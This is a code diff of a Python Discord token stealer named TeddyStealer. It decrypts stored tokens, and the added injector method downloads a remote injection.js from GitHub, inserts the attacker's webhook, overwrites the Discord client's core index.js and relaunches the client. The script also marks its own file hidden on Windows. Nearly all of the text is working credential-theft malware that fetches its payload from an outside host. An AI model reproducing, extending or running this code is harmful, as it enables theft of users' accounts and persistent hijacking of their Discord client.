@@ -8,7 +8,7 @@ import random
 import platform
 import requests
 
-from re import findall
+from re import findall, match
 from base64 import b64decode
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
@@ -172,8 +172,19 @@ class TeddyStealer(functions):
                             for y in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                 token = self.decryptToken(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.getKey())
                                 self.tokens.append(token)
-if __name__ == "__main__":
-    if os.name == 'nt':
-        if config.get('hide_self'):
-            ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)
-        TeddyStealer()
+
+    def injector(self):
+        for _dir in os.listdir(self.pc_local):
+            if 'discord' in _dir.lower():
+                for __dir in os.listdir(os.path.abspath(self.pc_local+os.sep+_dir)):
+                    if match(r'app-(\d*\.\d*)*', __dir):
+                        abspath = os.path.abspath(self.pc_local+os.sep+_dir+os.sep+__dir) 
+                        f = requests.get("https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js").text.replace("%WEBHOOK%", config.get('webhook'))
+                        with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
+                            indexFile.write(f)
+                        os.startfile(abspath+os.sep+_dir+'.exe')
+
+if __name__ == "__main__" and os.name == 'nt':
+    if config.get('hide_self'):
+        ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)
+    TeddyStealer()
